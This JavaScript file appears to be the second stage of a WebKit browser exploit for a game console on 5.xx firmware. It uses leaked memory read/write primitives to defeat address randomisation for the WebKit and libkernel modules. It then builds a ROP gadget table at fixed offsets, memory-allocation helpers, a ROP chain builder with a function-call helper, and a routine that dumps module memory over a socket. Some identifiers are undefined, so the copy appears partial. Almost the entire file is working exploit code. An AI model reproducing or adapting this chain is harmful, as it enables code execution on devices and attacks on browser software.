var p;
var ping = function(str) {
    "use strict";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, false);
    xhr.send(null);
}
var findModuleBaseXHR = function(addr)
{
    var addr_ = addr.add32(0); // copy
    addr_.low &= 0xFFFFF000;
    ping("START: " + addr_);
    
    while (1) {
        var vr = p.read4(addr_.add32(0x110-4));
        ping("step" + addr_);
        addr_.sub32inplace(0x1000);
    }
}
var log = function(x) {
    document.getElementById("console").innerText += x + "\n";
}
var print = function(string) { // like log but html
    document.getElementById("console").innerHTML += string + "\n";
}

var dumpModuleXHR = function(moduleBase) {
    var chunk = new ArrayBuffer(0x1000);
    var chunk32 = new Uint32Array(chunk);
    var chunk8 = new Uint8Array(chunk);
    
    connection.binaryType = "arraybuffer";
    var helo = new Uint32Array(1);
    helo[0] = 0x41414141;
    
    var moduleBase_ = moduleBase.add32(0);
    connection.onmessage = function() {
        try {
            for (var i = 0; i < chunk32.length; i++)
            {
                var val = p.read4(moduleBase_);
                chunk32[i] = val;
                moduleBase_.add32inplace(4);
            }
            connection.send(chunk8);
        } catch (e) {
            print(e);
        }
    }
}
var exploit = function() {
  p=window.primitives;

    print ("[+] exploit succeeded");
    print("webkit exploit result: " + p.leakval(0x41414141));
    print ("--- welcome to stage2 ---");
    
    p.leakfunc = function(func)
    {
        var fptr_store = p.leakval(func);
        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
    } 
    var parseFloatStore = p.leakfunc(parseFloat);
    var parseFloatPtr = p.read8(parseFloatStore);
    print("parseFloat at: 0x" + parseFloatPtr);
    
    var webKitBase = p.read8(parseFloatStore);
    window.webKitBase = webKitBase;
    webKitBase.low &= 0xfffff000;
    webKitBase.sub32inplace(0x5b7000-0x1C000);
    
    window.moduleBaseWebKit = webKitBase;

    print("libwebkit base at: 0x" + webKitBase);
    
    var o2wk = function(o)
    /*
      kchain.push(window.gadgets["pop rax"]);
      kchain.push(savectx.add32(0x30));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(kernel_slide);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rdi"]);
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov [rdi], rax"]);
      */
    {
        return webKitBase.add32(o);
    }
          gadgets = {    
  "ret":                    o2wk(0x3C),
  "jmp rax":                o2wk(0x82),
  "ep":                     o2wk(0xAD),
  "pop rbp":                o2wk(0xB6),
  "mov [rdi], rax":         o2wk(0x3FBA),
  "pop r8":                 o2wk(0xCC42),
  "pop rax":                o2wk(0xCC43),
  "mov rax, rdi":           o2wk(0xE84E),
  "mov rax, [rax]":         o2wk(0x130A3),
  "mov rdi, rax; jmp rcx":  o2wk(0x3447A), 
  "pop rsi":                o2wk(0x7B1EE),
  "pop rdi":                o2wk(0x7B23D),
  "add rsi, rcx; jmp rsi":  o2wk(0x1FA5D4),
  "pop rcx":                o2wk(0x271DE3),
  "pop rsp":                o2wk(0x27A450),
  "mov [rdi], rsi":         o2wk(0x39CF70),
  "mov [rax], rsi":         o2wk(0x2565a7),
  "add rsi, rax; jmp rsi":  o2wk(0x2e001),
  "pop rdx":                o2wk(0xdedc2),
  "pop r9":                 o2wk(0xbb30cf),
  "add rax, rcx":           o2wk(0x15172),
  "jop":                    o2wk(0xc37d0),
  "infloop":                o2wk(0x12C4009),

  "stack_chk_fail": o2wk(0xc8),
        "memset": o2wk(0x228),
        "setjmp": o2wk(0x14f8)
    };
   
/*
    var libSceLibcInternalBase = p.read8(deref_stub_jmp(gadgets['stack_chk_fail']));
    libSceLibcInternalBase.low &= ~0x3FFF;
    libSceLibcInternalBase.sub32inplace(0x20000);
    print("libSceLibcInternal: 0x" + libSceLibcInternalBase.toString());
    window.libSceLibcInternalBase = libSceLibcInternalBase;
*/
    var libKernelBase = p.read8(deref_stub_jmp(gadgets.stack_chk_fail));
    window.libKernelBase = libKernelBase;
    libKernelBase.low &= 0xfffff000;
    libKernelBase.sub32inplace(0x12000);
    
    window.moduleBaseLibKernel = libKernelBase;
    
    print("libkernel_web base at: 0x" + libKernelBase);
       
function malloc(size)
{
  var backing = new Uint8Array(0x10000 + size);

  window.nogc.push(backing);

  var ptr     = p.read8(p.leakval(backing).add32(0x10));
  ptr.backing = backing;

  return ptr;
}
function mallocu32(size)
{
  var backing = new Uint8Array(0x10000 + size * 4);

  window.nogc.push(backing); 
  
  var ptr     = p.read8(p.leakval(backing).add32(0x10));
      ptr.backing = backing;

      return ptr;
    } 

  function stringify(str)
 {
  var bufView = new Uint8Array(str.length + 1);

  for(var i=0; i < str.length; i++) {
       bufView[i] = str.charCodeAt(i) & 0xFF;
  }
  window.nogc.push(bufView);
  return p.read8(p.leakval(bufView).add32(0x10));
}
   
   var krop = function (p, addr) {
  // Contains base and stack pointer for fake stack (this.stackBase = RBP, this.stackPointer = RSP)
  this.stackBase    = addr;
  this.stackPointer = 0;
  // Push instruction / value onto fake stack
  this.push = function (val) {
    p.write8(this.stackBase.add32(this.stackPointer), val);
    this.stackPointer += 8;
  };
  // Write to address with value (helper function)
  this.write64 = function (addr, val) {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov [rdi], rax"]);
  }
  // Return krop object
  return this;
};
   
    window.Rop = function () {
        this.stack = new Uint32Array(0x10000);
        this.stackPointer = p.read8(p.leakval(this.stack).add32(0x10));
        this.count = 0;
        
        this.clear = function() {
            this.count = 0;
            this.runtime = undefined;
            
            for (var i = 0; i < 0x1000/8; i++)
            {
                p.write8(this.stackBase.add32(i*8), 0);
            }
        };
        
        this.pushSymbolic = function() {
            this.count++;
            return this.count-1;
        }
        
        this.finalizeSymbolic = function(idx, val) {
            p.write8(this.stackBase.add32(idx*8), val);
        }
        
        this.push = function(val) {
            this.finalizeSymbolic(this.pushSymbolic(), val);
        }
         this.push_write8 = function(where, what)
  {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(where); // where
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(what); // what
      this.push(gadgets["mov [rdi], rsi"]); // perform write
  }
       this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
  {
    if (rdi != undefined) {
      this.push(gadgets["pop rdi"]); // pop rdi
      this.push(rdi); // what
    }
    if (rsi != undefined) {
      this.push(gadgets["pop rsi"]); // pop rsi
      this.push(rsi); // what
    }
    if (rdx != undefined) {
      this.push(gadgets["pop rdx"]); // pop rdx
      this.push(rdx); // what
    }
    if (rcx != undefined) {
      this.push(gadgets["pop rcx"]); // pop r10
      this.push(rcx); // what
    }
    if (r8 != undefined) {
      this.push(gadgets["pop r8"]); // pop r8
      this.push(r8); // what
    }
    if (r9 != undefined) {
      this.push(gadgets["pop r9"]); // pop r9
      this.push(r9); // what*/
    }

    this.push(rip); // jmp
    return this;
  }
        
      this.run = function() {
      var retv = p.loadchain(this, this.notimes);
      this.clear();
      return retv;
  }
  
  return this;
};
   
 
    log("--- welcome to stage 3: triggers---");
    
        
    log("loaded syscalls");
    print("all good. fcall test retval = Successful");   
    print     ("all stages test");
    print     ("NOT FULL 5.xx");
    
}

   
